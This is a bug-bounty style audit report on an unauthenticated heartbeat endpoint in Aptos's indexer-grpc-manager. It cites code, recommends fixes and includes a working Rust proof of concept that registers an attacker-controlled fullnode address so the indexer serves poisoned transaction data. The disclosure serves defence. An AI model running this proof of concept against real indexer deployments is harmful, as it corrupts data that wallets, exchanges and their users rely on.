# Audit Report

## Title
Unauthenticated Fullnode Injection via Heartbeat Endpoint Enables Data Poisoning Attack

## Summary
The indexer-grpc-manager accepts unauthenticated heartbeat requests that allow arbitrary fullnode addresses to be injected into the trusted fullnode pool. These injected addresses are then used as data sources for serving transaction data to clients, enabling an attacker to poison the data distribution pipeline with incorrect blockchain data.

## Finding Description

The `args.run()` startup flow initializes the indexer-grpc-manager service which exposes an unauthenticated gRPC heartbeat endpoint. This endpoint allows any network peer to register arbitrary fullnode addresses into the manager's trusted data source pool.

**Attack Flow:**

1. The heartbeat RPC endpoint accepts HeartbeatRequest without authentication [1](#0-0) 

2. The service extracts the address from the client-provided request and passes it to the metadata manager [2](#0-1) 

3. When handling FullnodeInfo, the metadata manager adds any new address to the fullnodes DashMap using `or_insert()`, creating a new trusted client connection [3](#0-2) 

4. The injected fullnode address is then randomly selected when fetching transaction data in the main data ingestion loop [4](#0-3) 

5. The same injected fullnode can be selected in fallback mode when the cache is lagging and `allow_fn_fallback` is enabled [5](#0-4) 

6. The fullnode selection randomly picks from ALL fullnodes including injected ones, with no distinction between configured and dynamically added addresses [6](#0-5) 

The malicious fullnode can serve modified transaction data that is:
- Cached by the data manager and served to all subsequent clients
- Potentially uploaded to the file store if the manager is configured as master, persisting the poisoned data

**Security Guarantees Broken:**
- **Data Integrity**: The indexer can serve incorrect blockchain data to applications
- **Trust Boundary**: Unauthenticated external actors can inject themselves into the trusted data source pool
- **Fallback Safety**: The `allow_fn_fallback` mechanism intended for high availability becomes an attack vector when the fullnode pool is poisoned

## Impact Explanation

This vulnerability enables data poisoning attacks against applications consuming the indexer-grpc API. While this does not affect the core blockchain consensus or validator operations, it can lead to:

- **Incorrect transaction data** served to wallets, exchanges, and DeFi applications
- **Financial losses** if applications make decisions based on poisoned data (e.g., displaying wrong balances, processing fraudulent transactions)
- **Persistent data corruption** if the manager uploads poisoned data to the file store
- **Trust erosion** in the Aptos ecosystem's data infrastructure

Per Aptos bug bounty criteria, this qualifies as **Medium Severity**: "Limited funds loss or manipulation" and "State inconsistencies requiring intervention" (up to $10,000). The indexer service requires manual intervention to remove injected addresses and potentially restore file store data.

## Likelihood Explanation

**Likelihood: HIGH**

**Attacker Requirements:**
- Network access to send gRPC requests to the indexer-grpc-manager (depends on deployment configuration)
- Ability to run a malicious gRPC server to respond to data requests
- No authentication credentials required
- No privileged access required

**Exploitation Complexity:**
- Simple gRPC client can craft and send malicious heartbeat
- Attack works immediately in normal operation (not just fallback mode)
- No race conditions or timing requirements
- Publicly accessible indexer endpoints are common in blockchain infrastructure

The attack is straightforward to execute and works against any publicly exposed indexer-grpc-manager instance. The main loop continuously uses `get_fullnode_for_request()` which can select injected addresses at any time.

## Recommendation

**Immediate Fix:**

1. **Implement authentication** on the heartbeat endpoint using mutual TLS or API tokens to verify the identity of services sending heartbeats

2. **Validate fullnode addresses** against a configuration whitelist before adding to the trusted pool:

```rust
fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
    // Only allow configured fullnode addresses
    if !self.fullnodes.contains_key(&address) {
        warn!("Rejecting heartbeat from unconfigured fullnode: {}", address);
        return Err(anyhow::anyhow!("Unauthorized fullnode address"));
    }
    
    let mut entry = self.fullnodes.get_mut(&address).unwrap();
    entry.value_mut().recent_states.push_back(info);
    // ... rest of logic
}
```

3. **Add address verification** by checking cryptographic signatures on heartbeat messages proving ownership of the advertised address

4. **Implement rate limiting** on heartbeat endpoint to prevent flooding attacks

**Long-term Improvements:**
- Implement end-to-end data verification using blockchain state proofs
- Add monitoring and alerting for unexpected fullnode additions
- Implement data integrity checks comparing responses from multiple fullnodes
- Consider using authenticated service mesh for inter-component communication

## Proof of Concept

```rust
// Malicious client sending crafted heartbeat to inject fullnode address
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info, FullnodeInfo, HeartbeatRequest, ServiceInfo,
};
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to victim indexer-grpc-manager
    let channel = Channel::from_static("http://victim-manager:50051").connect().await?;
    let mut client = GrpcManagerClient::new(channel);

    // Craft malicious heartbeat with attacker-controlled fullnode address
    let malicious_fullnode_address = "http://attacker-fullnode:50051".to_string();
    
    let fullnode_info = FullnodeInfo {
        chain_id: Some(1), // Mainnet
        known_latest_version: Some(1000000000), // High version to appear current
        timestamp: Some(aptos_indexer_grpc_utils::timestamp_now_proto()),
    };

    let service_info = ServiceInfo {
        address: Some(malicious_fullnode_address),
        info: Some(Info::FullnodeInfo(fullnode_info)),
    };

    let request = HeartbeatRequest {
        service_info: Some(service_info),
    };

    // Send the malicious heartbeat - no authentication required
    let response = client.heartbeat(request).await?;
    println!("Injected malicious fullnode! Response: {:?}", response);

    // The attacker-controlled address is now in the trusted fullnode pool
    // and will be randomly selected for data fetching
    
    Ok(())
}
```

**Attack Outcome:**
1. Malicious fullnode address added to `metadata_manager.fullnodes` DashMap
2. When `get_fullnode_for_request()` is called, attacker's fullnode can be selected
3. Attacker's fullnode serves modified transaction data
4. Modified data is cached and served to all API clients
5. If manager is master, poisoned data is uploaded to file store

**Verification Steps:**
1. Deploy indexer-grpc-manager with public gRPC endpoint
2. Run PoC to inject malicious fullnode address via heartbeat
3. Monitor logs for "Fullnode (http://attacker-fullnode:50051) is picked for request"
4. Observe cache being populated with data from attacker's fullnode
5. Query the manager's API and receive poisoned transaction data

## Notes

This vulnerability affects the **indexer-grpc-manager auxiliary service**, not the core Aptos blockchain consensus. While the blockchain state itself remains secure, applications relying on the indexer for transaction data can receive incorrect information, potentially leading to financial losses or operational disruptions.

The issue directly answers the security question about startup dependencies forcing fallback to insecure modes: the unauthenticated dynamic addition of fullnode addresses creates an insecure operational mode where untrusted data sources are mixed with trusted ones.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L35-45)
```rust
    async fn handle_heartbeat(
        &self,
        address: String,
        info: Info,
    ) -> anyhow::Result<Response<HeartbeatResponse>> {
        self.metadata_manager.handle_heartbeat(address, info)?;

        Ok(Response::new(HeartbeatResponse {
            known_latest_version: Some(self.metadata_manager.get_known_latest_version()),
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L341-374)
```rust
    pub(crate) fn get_fullnode_for_request(
        &self,
        request: &GetTransactionsFromNodeRequest,
    ) -> (GrpcAddress, FullnodeDataClient<Channel>) {
        // TODO(grao): Double check the counters to see if we need a different way or additional
        // information.
        let mut rng = thread_rng();
        if let Some(fullnode) = self
            .fullnodes
            .iter()
            .filter(|fullnode| {
                fullnode
                    .recent_states
                    .back()
                    .is_some_and(|s| s.known_latest_version >= request.starting_version)
            })
            .choose(&mut rng)
            .map(|kv| (kv.key().clone(), kv.value().client.clone()))
        {
            COUNTER
                .with_label_values(&["get_fullnode_for_request__happy"])
                .inc();
            return fullnode;
        }

        COUNTER
            .with_label_values(&["get_fullnode_for_request__fallback"])
            .inc();
        self.fullnodes
            .iter()
            .choose(&mut rng)
            .map(|kv| (kv.key().clone(), kv.value().client.clone()))
            .unwrap()
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L533-550)
```rust
    fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
        let mut entry = self
            .fullnodes
            .entry(address.clone())
            .or_insert(Fullnode::new(address.clone()));
        entry.value_mut().recent_states.push_back(info);
        if let Some(known_latest_version) = info.known_latest_version {
            trace!(
                "Received known_latest_version ({known_latest_version}) from fullnode {address}."
            );
            self.update_known_latest_version(known_latest_version);
        }
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/data_manager.rs (L217-219)
```rust
            let (address, mut fullnode_client) =
                self.metadata_manager.get_fullnode_for_request(&request);
            trace!("Fullnode ({address}) is picked for request.");
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/data_manager.rs (L302-311)
```rust
                if self.lagging(cache_next_version) && self.allow_fn_fallback {
                    debug!("GrpcManager is lagging, getting data from FN, requested_version: {start_version}, cache_next_version: {cache_next_version}.");
                    let request = GetTransactionsFromNodeRequest {
                        starting_version: Some(start_version),
                        transactions_count: Some(5000),
                    };

                    let (_, mut fullnode_client) =
                        self.metadata_manager.get_fullnode_for_request(&request);
                    let response = fullnode_client.get_transactions_from_node(request).await?;
```
